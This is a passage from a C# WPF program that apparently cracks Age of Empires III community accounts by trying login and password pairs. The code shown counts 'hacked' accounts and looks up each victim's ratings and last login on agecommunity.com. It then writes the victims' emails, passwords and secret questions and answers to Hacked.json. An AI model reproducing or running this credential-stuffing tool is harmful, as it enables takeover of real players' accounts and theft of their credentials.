                                Interlocked.Increment(ref hackedAccsCount);

                                NotifyPropertyChanged("HackedAccsCount");


                            }

                        }
                        Interlocked.Increment(ref scannedPairsCount);
                        NotifyPropertyChanged("LeftHackedAccsTime");
                        NotifyPropertyChanged("ScannedPairsCount");
                        NotifyPropertyChanged("LeftPairsCount");
                        NotifyPropertyChanged("Scanned");

                    }
                }));
            }
            await Task.WhenAll(tasks);

            var q2 = new ConcurrentQueue<PlayerInfo>(alreadyHacked.Values);
            var tasks2 = new List<Task>();


            List<PlayerInfo> la = new List<PlayerInfo>();
            object stat = new object();
            for (int n = 0; n < HackedAccsWorkers; n++)
            {
                tasks2.Add(Task.Run(async () =>
                {
                    while (q2.TryDequeue(out PlayerInfo acc))
                    {
                        //  Console.WriteLine(WebUtility.UrlEncode(player.Name));
                        var names = await HttpGetAsyncEx("http://www.agecommunity.com/query/query.aspx?md=user&name=" + WebUtility.UrlEncode(acc.Login));
                        //    Console.WriteLine(names);
                        XmlDocument doc = new XmlDocument();
                        doc.LoadXml(names);
                        short node = 0;
                        short node2 = 0;
                        short node3 = 0;
                        var node4 = "";
                        try
                        {
                            node = Convert.ToInt16(doc.DocumentElement.SelectSingleNode("//ratings/s/skillLevel").InnerText);
                            node2 = Convert.ToInt16(doc.DocumentElement.SelectSingleNode("//ratings/sy/skillLevel").InnerText);
                            node3 = Convert.ToInt16(doc.DocumentElement.SelectSingleNode("//ratings/ty/skillLevel").InnerText);
                            node4 = doc.DocumentElement.SelectSingleNode("//user/lastLogin").InnerText;
                        }
                        catch
                        {

                        }
                        lock (stat)
                        {
                            la.Add(new PlayerInfo() { Email = acc.Email, Password = acc.Password, SecretAnswer = acc.SecretAnswer, SecretQuestion = acc.SecretQuestion, Login = acc.Login, pr_nilla = node, pr_tad = node2, pr_tad_tr = node3, lastLogin = node4 });
                        }
                    }
                }));
            }
            await Task.WhenAll(tasks2);

            foreach (var item in la)
            {
                var ha = hackedAccs.FirstOrDefault(x => x.Login == item.Login);
                ha.pr_nilla = item.pr_nilla;
                ha.pr_tad = item.pr_tad;
                ha.pr_tad_tr = item.pr_tad_tr;
                ha.lastLogin = item.lastLogin;
                ha.elo_link = "http://aoe3.jpcommunity.com/rating2/player/?n=" + ha.Login;
            }

            File.WriteAllText("Hacked.json", JsonConvert.SerializeObject(hackedAccs, Newtonsoft.Json.Formatting.Indented));
            HackedAccsTimer.Stop();

            slPasswordsCount.IsEnabled = true;
            tbHackedLogins.IsReadOnly = false;
            tbHackedPasswords.IsReadOnly = false;



            bHackedAccsPause.IsEnabled = false;
            bHackedAccsStop.IsEnabled = false;
            bHackedAccsRun.IsEnabled = false;

            tbHackedAccsWorkers.IsReadOnly = false;
            (sender as Button).IsEnabled = true;

        }








        public partial class PlayerInfo : INotifyPropertyChanged
        {
            public event PropertyChangedEventHandler PropertyChanged;

            protected void OnPropertyChanged([CallerMemberName] string propertyName = null)
               => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));


            protected bool SetField<T>(ref T field, T value,
    [CallerMemberName] string propertyName = null)
            {
                if (EqualityComparer<T>.Default.Equals(field, value)) return false;
                field = value;
                OnPropertyChanged(propertyName);
                return true;
            }


            private string login;
            public string Login
            {
                get => login;


                set => SetField(ref login, value);
            }


            private string password;
            public string Password
            {
                get => password;


                set => SetField(ref password, value);
            }


            private string email;
            public string Email
            {
                get => email;


                set => SetField(ref email, value);
            }

            private string secretQuestion;
            public string SecretQuestion
            {
                get => secretQuestion;


                set => SetField(ref secretQuestion, value);
            }

            private string secretAnswer;
            public string SecretAnswer
            {
                get => secretAnswer;


                set => SetField(ref secretAnswer, value);
            }
            private short _pr_nilla;
            public short pr_nilla
            {
                get => _pr_nilla;


                set => SetField(ref _pr_nilla, value);
            }
            private short _pr_tad;
            public short pr_tad
            {
                get => _pr_tad;


                set => SetField(ref _pr_tad, value);
            }
            private short _pr_tad_tr;
            public short pr_tad_tr
            {
                get => _pr_tad_tr;


                set => SetField(ref _pr_tad_tr, value);
            }
            private string _elo_link;
            public string elo_link
            {
                get => _elo_link;


                set => SetField(ref _elo_link, value);
            }
            public string _lastLogin;
            public string lastLogin
            {
                get => _lastLogin;


                set => SetField(ref _lastLogin, value);
            }

        }



        private void Button_Click_16(object sender, RoutedEventArgs e)
        {
            bLoginsPause.IsEnabled = false;
            LoginsTimer.Stop();
            LoginsCancelTokenSource.Cancel();
            LoginsState = 1;
            bLoginsRun.IsEnabled = true;
            bLoginsStop.IsEnabled = true;
        }

        private void BLoginsRun_Click(object sender, RoutedEventArgs e)
        {
            bLoginsRun.IsEnabled = false;
            LoginsTimer.Start();
            LoginsCancelTokenSource = new CancellationTokenSource();
            LoginsToken = LoginsCancelTokenSource.Token;
            LoginsState = 0;
            bLoginsStop.IsEnabled = true;
            bLoginsPause.IsEnabled = true;
        }

        private void BLoginsStop_Click(object sender, RoutedEventArgs e)
        {
            bLoginsStop.IsEnabled = false;
            bLoginsPause.IsEnabled = false;
            bLoginsRun.IsEnabled = false;
            LoginsCancelTokenSource.Cancel();
            LoginsState = 2;
        }

        private void BHackedAccsRun_Click(object sender, RoutedEventArgs e)
        {
            bHackedAccsRun.IsEnabled = false;
            HackedAccsTimer.Start();
            HackedAccsCancelTokenSource = new CancellationTokenSource();
            HackedAccsToken = HackedAccsCancelTokenSource.Token;
            HackedAccsState = 0;
            bHackedAccsStop.IsEnabled = true;
            bHackedAccsPause.IsEnabled = true;
        }

        private void BHackedAccsPause_Click(object sender, RoutedEventArgs e)
        {
            bHackedAccsPause.IsEnabled = false;
            HackedAccsTimer.Stop();
            HackedAccsCancelTokenSource.Cancel();
            HackedAccsState = 1;
            bHackedAccsRun.IsEnabled = true;
            bHackedAccsStop.IsEnabled = true;
        }

        private void BHackedAccsStop_Click(object sender, RoutedEventArgs e)
        {
            bHackedAccsStop.IsEnabled = false;
            bHackedAccsPause.IsEnabled = false;
            bHackedAccsRun.IsEnabled = false;
            HackedAccsCancelTokenSource.Cancel();
            HackedAccsState = 2;
        }

        private GridViewColumnHeader listViewSortCol = null;
        private SortAdorner listViewSortAdorner = null;

        public class SortAdorner : Adorner
        {
            private static Geometry ascGeometry =
                Geometry.Parse("M 0 4 L 3.5 0 L 7 4 Z");

            private static Geometry descGeometry =
                Geometry.Parse("M 0 0 L 3.5 4 L 7 0 Z");

            public ListSortDirection Direction { get; private set; }

            public SortAdorner(UIElement element, ListSortDirection dir)
                : base(element)
            {
                this.Direction = dir;
            }

            protected override void OnRender(DrawingContext drawingContext)
            {
                base.OnRender(drawingContext);

                if (AdornedElement.RenderSize.Width < 20)
                    return;

                TranslateTransform transform = new TranslateTransform
                    (
                        AdornedElement.RenderSize.Width - 15,
                        (AdornedElement.RenderSize.Height - 5) / 2
                    );
                drawingContext.PushTransform(transform);

                Geometry geometry = ascGeometry;
                if (this.Direction == ListSortDirection.Descending)
                    geometry = descGeometry;
                drawingContext.DrawGeometry(Brushes.Black, null, geometry);

                drawingContext.Pop();
            }
        }

        private void GridViewColumnHeader_Click(object sender, RoutedEventArgs e)
        {
            GridViewColumnHeader column = (sender as GridViewColumnHeader);
            string sortBy = column.Tag.ToString();
            if (listViewSortCol != null)
            {
                AdornerLayer.GetAdornerLayer(listViewSortCol).Remove(listViewSortAdorner);
                listView4.Items.SortDescriptions.Clear();
            }

            ListSortDirection newDir = ListSortDirection.Ascending;
            if (listViewSortCol == column && listViewSortAdorner.Direction == newDir)
                newDir = ListSortDirection.Descending;

            listViewSortCol = column;
            listViewSortAdorner = new SortAdorner(listViewSortCol, newDir);
            AdornerLayer.GetAdornerLayer(listViewSortCol).Add(listViewSortAdorner);
            listView4.Items.SortDescriptions.Add(new SortDescription(sortBy, newDir));
        }
    }






}
